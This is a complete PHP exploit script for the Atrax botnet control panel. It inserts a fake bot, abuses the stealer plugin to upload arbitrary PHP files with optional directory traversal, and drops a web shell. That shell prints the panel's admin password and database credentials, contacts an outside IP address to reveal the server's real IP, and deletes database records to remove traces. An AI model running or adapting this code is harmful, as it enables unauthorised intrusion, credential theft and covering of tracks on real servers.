#!/usr/bin/php
<?php
/*
 * Atrax - Remote File Upload Exploit
 * Author: Lior Ben-Porat
 * 
 * Before using this exploit you must first install the 'pecl_http' package:
 * pecl_http-1.7.6 php-http libpcre3-dev libcurl3-dev
 */

error_reporting(0);

// Define the panel's GET-POST parameters abbr.
define('GET_PARAM_MODE', 'a');
define('BOT_MODE_INSERT', 'b');
define('BOT_MODE_RUNPLUGIN', 'e');

define('POST_PARAM_GUID', 'h');
define('POST_PARAM_IP', 'i');
define('POST_PARAM_BUILDID', 'j');
define('POST_PARAM_PC', 'k');
define('POST_PARAM_OS', 'l');
define('POST_PARAM_ADMIN', 'm');
define('POST_PARAM_CPU', 'n');
define('POST_PARAM_GPU', 'o');

define('POST_PARAM_PLUGINNAME', 'q');
define('BITCOIN_WALLET_STEALER_TYPE', 'ai');
define('post_plugin_payload', 'ab');
define('post_plugin_filename', 'ad');
define('post_plugin_host', 'am');

// Random string generator
function generateRandomString($length = 5) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

//Get real-path for URLs
function canonicalize($address) {
    $address = explode('/', $address);
    $keys = array_keys($address, '..');
    foreach($keys AS $keypos => $key) {
        array_splice($address, $key - ($keypos * 2 + 1), 2);
    }
    $address = implode('/', $address);
    $address = str_replace('./', '', $address);
    return $address;
}

// HTTP data-sender
function SendData($url, $post_data = array(null=>null), $bodyFlag = 0) {
    $request = new HttpRequest($url, HttpRequest::METH_POST);
    $request->setHeaders(array('User-Agent' => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)'));
    $request->addHeaders(array('Expect' => ''));    // Disable the request for 100-Continue message
    $request->addPostFields($post_data);
    try {
        if($bodyFlag) {
            $response = $request->send()->getBody();
        } else {
            $response = $request->send()->getResponseCode();
        }
    } catch (HttpException $ex) {
        $response = $ex;
    }
    return $response;
}

// Read payload file
function readPayload($file) {
    if(file_exists($file) && is_file($file) && is_readable($file)) {
        return file_get_contents($file);
    } else {
        print "\t[*] Couldn't open payload!\n\n";
        exit();
    }
}

// URL status-checker
function checkStatus($base_url, $path, $drop_basename) {
    $drop_status = SendData($base_url.$path.$drop_basename);
    if($drop_status != 200) {
        return false;
    } elseif($drop_status != SendData($base_url.$path.generateRandomString(10).".php")) {
        return true;
    } else {
        return false;
    }
}

// Create random bot information
function CreateBotInformation() {
    $bot = array(
        guid => strtoupper(md5(generateRandomString())),
        ip => rand(1,254).".".rand(1,254).".".rand(1,254).".".rand(1,254),
        ver => rand(1,4),
        name => "COMPUTER-".generateRandomString(),
        os => rand(1,18),   // 1=Windows 8 32-Bit, 2=Windows 8 64-Bit, 3=Windows Server 2012 64-Bit ,4=Windows 7 32-Bit, 5=Windows 7 64-Bit, 6=Windows Server 2008 R2 64-Bit, 7=Windows Server 2008 32-Bit, 8=Windows Server 2008 64-Bit, 9=Windows Vista 32-Bit, 10=Windows Vista 64-Bit, 11=Windows Server 2003 R2 32-Bit, 12=Windows Home Server 32-Bit, 13=Windows Server 2003 32-Bit, 14=Windows XP 64-Bit, 15=Windows XP 32-Bit. 16=Windows 2000 32-Bit, 17=Windows 8.1 32-Bit, 18=Windows 8.1 64-Bit, 19=UNKNOWN
        admin => "y",
        cpu => rawurlencode("Intel(R) Core(TM) i7 CPU         930  @ 2.80GHz"),
        gpu => rawurlencode("ATI Radeon HD 4000 Graphics Family"),
    );
    return $bot;
}

// Create basic array to POST
function basicPostArray($bot) {
    $postArray = array(
        POST_PARAM_GUID => $bot['guid'],
        POST_PARAM_IP => $bot['ip'],
        POST_PARAM_BUILDID => $bot['ver'],
        POST_PARAM_PC => $bot['name'],
        POST_PARAM_OS => $bot['os'],
        POST_PARAM_ADMIN => $bot['admin'],
        POST_PARAM_CPU => $bot['cpu'],
        POST_PARAM_GPU => $bot['gpu']
    );
    return $postArray;
}

// Bot insert command
function postInsert($url, $bot) {
    $url .= "?".GET_PARAM_MODE."=".BOT_MODE_INSERT;
    $postArray = basicPostArray($bot);
    if(SendData($url,$postArray) == 200) {
        return true;
    } else {
        return false;
    }
}

// Bot plugin command + added POST fields
function postExploit($url, $bot, $payload, $filename) {
    $url .= "?".GET_PARAM_MODE."=".BOT_MODE_RUNPLUGIN;
    $postArray = basicPostArray($bot);
    $postArray[POST_PARAM_PLUGINNAME] = "atraxstealer";
    $postArray[BITCOIN_WALLET_STEALER_TYPE] = 18;   // The number represent result of intval(fkTypeId,16)==24
    $postArray[post_plugin_payload] = base64_encode($payload);  // base64 encoded payload
    $postArray[post_plugin_filename] = $filename;   //file-name of the payload
    $postArray[post_plugin_host] = generateRandomString();
    if(SendData($url,$postArray) == 200) {
        return true;
    } else {
        return false;
    }
}

// Upload test-file
function testExploit($url, $bot, $base_url) {
    $test_filename = strtoupper(md5(generateRandomString())).".php"; // Set a random filename for the testfile
    $payload = "<?php echo(\"abc123\"); unlink(\"$test_filename\");?>";    // testfile payload
    $test_path = exploit($url, $bot ,$base_url, $payload, $test_filename);
    if(SendData($test_path, array(null=>null), 1) == "abc123") {
        return true;
    } else {
        return false;
    }
}

// Upload payload
function exploit($url, $bot, $base_url, $payload, $filename) {
    postExploit($url, $bot, $payload, $filename);
    return $base_url."plugins/atraxstealer/wallet/".$filename;  // payload full-path
}

// Upload atrax-shell to the server (curlmyip.com)
function uploadShell($url, $bot, $base_url) {
    $filename = strtoupper(md5(generateRandomString())).".php";
    $payload = '<?php
        function leave($msg) { global $con; mysqli_close($con); echo $msg; unlink("'.$filename.'"); }
        if(!is_readable("../../../config.php")) { leave("Failed to open config!"); }
        include "../../../config.php";
        if (isset($_POST["getInfo"])) { echo "\t\tAdmin-pass:\t".PASSWORD."\n\t\tHost:\t".HOST."\n\t\tUser:\t".USER."\n\t\tPassword:\t".PASS."\n\t\tDB-Name:\t".DB."\n"; exit(); }
        if (isset($_POST["getIP"])) { echo trim(file_get_contents("http://184.106.112.172/")).":".$_SERVER["SERVER_PORT"]; exit(); }
        $con=mysqli_connect(HOST,USER,PASS,DB);
        if(mysqli_connect_errno()) { leave("Failed to connect DB!"); }
        if (mysqli_query($con,"DELETE FROM plugin_atraxstealer WHERE GUID=UNHEX(\''.$bot[guid].'\');")) {
        leave("All traces successfully removed from DB!"); } else { leave("Failed to remove traces! Remove manually."); } ?>';
    $shell_path = exploit($url, $bot, $base_url, $payload, $filename);
    return $shell_path;
}

// Show usage
function usage($argv) {
	passthru('clear');
	print "\n\t"."Usage: ".$argv." [-u|--url=] <URL> [-f|--file=] <path>  {OPTIONAL: [-n|--name=] <filename>  [-q|--force-online]"."\n".
	"\n\t"."[-u] or [--url=]"."\t\t"."# Provide the drop's URL to exploit.".
	"\n\t"."[-f] or [--file=]"."\t\t"."# Provide path for the payload to upload to the remote server.".
	"\n\t"."[-n] or [--name=]"."\t\t"."# OPTIONAL: Provide custom filename for the payload on the remote server.".
    "\n\t"."[-q] or [--force-online]"."\t"."# OPTIONAL: Use in case you want to ignore the URL status.".
	"\n\t"."[-h] or [--help]"."\t\t"."# Display this usage.".
    "\n\n\t"."NOTE:"."\t"."Directory-Travesal can be done when using the 'filname' flag, e.g. -n \"../../shell.php\".".
    "\n\t"."IMPORTANT NOTE:"."\t"."In any case the Atrax-Stealer plugin is not activated, the exploit will fail to upload the shell.";
	print "\n\n";
	exit();
}

###################
## Main function ##
###################

// Provide the arguments via CLI
$shortopts = "u:f:n:hq"; // [url]
$longopts  = array("url:","file:","name:","help","force-online");
$opts = getopt($shortopts, $longopts);

// Set drop's URL
if($opts["url"]) {
    $url = $opts["url"];
} else {
    $url = $opts["u"];
}

// Set file to upload
if($opts["file"]) {
    $file = $opts["file"];
} else {
    $file = $opts["f"];
}

// Set custom filename to use on the server
if($opts["name"]) {
    $name = $opts["name"];
} elseif($opts["n"]) {
    $name = $opts["n"];
} else {
    $name = strtoupper(md5(generateRandomString())).".php";
}

// Call for usage when asking for help or missing information
if (is_bool($opts["h"]) || is_bool($opts["help"])) { usage($argv[0]); }
if (!$url || !$file) { usage($argv[0]); }

// Parse URL
$base_url = parse_url($url,PHP_URL_SCHEME) . "://" .parse_url($url,PHP_URL_HOST) . parse_url($url,PHP_URL_PORT);
$path = dirname(parse_url($url,PHP_URL_PATH))."/";
$drop_basename = basename(parse_url($url,PHP_URL_PATH));
print "\n\t[*] Atrax Drop-Point: $url\n\n";

// Read payload content
$file = readPayload($file);

// Check for URL status
if(!is_bool($opts["q"]) && !is_bool($opts["force-online"])) {
    print "\t[*] Checking URL status...\n";
    if(!checkStatus($base_url, $path, $drop_basename)) {
        print "\t[*] Drop URL is offline. Use force-online flag (-q) if needed!\n\n";
        exit();
    } else {
        print "\t[*] URL is online!\n";
    }
}

// Creating a fake bot information
$bot=CreateBotInformation();

// Adding a fake bot to the botnet
print "\t[*] PHASE 1: Inserting a fake bot information to the panel\n";
if(postInsert($url,$bot)) {
    print "\t[+] Bot info added successfuly!\n\n";
    print "\t[*] PHASE 2: Trying to upload the test-file\n";
    
    // Sending a test-file
    if(testExploit($url, $bot, $base_url.$path)) {
        print "\t[+] Test file successfully uploaded!\n\n";
	// Sending the payload
        $payload_path = exploit($url,$bot, $base_url.$path, $file, $name);
        $payload_path = canonicalize($payload_path);
        if(SendData($payload_path, array(null=>null)) == 200) {
            print "\t[*] PHASE 3:\n";
            print "\t[+] Shell successfully uploaded to: $payload_path\n";
            // Sending Atrax-shell for information and traces-removal
	    $shell_path = uploadShell($url, $bot, $base_url.$path);
            if(SendData($shell_path, array(getIP=>1)) == 200) {
                $realIP = SendData($shell_path, array(getIP=>1), 1);
                print "\t[+] Server's real-IP: $realIP\n";
                $db_info = SendData($shell_path, array(getInfo=>1), 1);
                print "\t[+] Panel information:\n\n$db_info\n";
                $rm_traces = SendData($shell_path, array(rmTrace=>1), 1);
                print "\t[*] PHASE 4: ".$rm_traces ."\n\n";
            } else {
                print "\n\t[-] ERROR: Failed to upload Atrax-Shell, remove traces manually!\n\n";
            }
        } else {
            print "\t[-] ERROR: Failed to upload the payload, try to upload a smaller file!\n\n";
        }
    } else {
        print "\t[-] ERROR: Failed to upload the test file! :(\n";
        print "\t[-] Exiting now...\n\n";
    }
} else {
    print "\t[-] Couldn't insert bot-information\n";
    print "\t[-] Exiting now...\n\n";
}

?>
